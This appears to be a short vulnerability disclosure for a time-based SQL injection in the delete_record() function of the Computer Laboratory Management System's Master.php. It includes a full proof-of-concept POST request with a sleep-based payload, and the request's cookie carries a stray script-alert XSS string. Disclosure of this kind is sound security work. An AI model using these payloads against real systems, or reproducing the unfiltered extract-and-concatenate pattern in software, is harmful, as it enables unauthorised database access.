#### There is sql injection in the delete_record() method of the /classes/Master.php file of the Computer Laboratory  Management System.

Key Code:

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240830194629284.png)

The `$id` is spliced into the sql statement without any filtering, which can be done with the code `extract($_POST);` which assigns a value to the `$id` as a malicious sql injection command.

**Vulnerability validation**

poc

```
POST /classes/Master.php?f=delete_record HTTP/1.1
Host: localhost:98
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://localhost:98
Connection: keep-alive
Referer: http://localhost:98/?XDEBUG_SESSION_START=14848
Cookie: Phpstorm-9dbbfc29=4d9b54b0-3f53-4e67-ae29-a3fb9f021bbb; user=admin; name=aa%3Cscript%3Ealert%28111%29%3C%2Fscript%3E; mail=86226999%40qq.com; url=http%3A%2F%2F127.0.0.1; PHPSESSID=leagsbs030cq18dj30osfipt3t; XDEBUG_SESSION=14848
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i

id='/**/or/**/(select(1)from(select(sleep(6)))x)#
```

As shown in the figure, the time delay 6 s

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240830194849116.png)

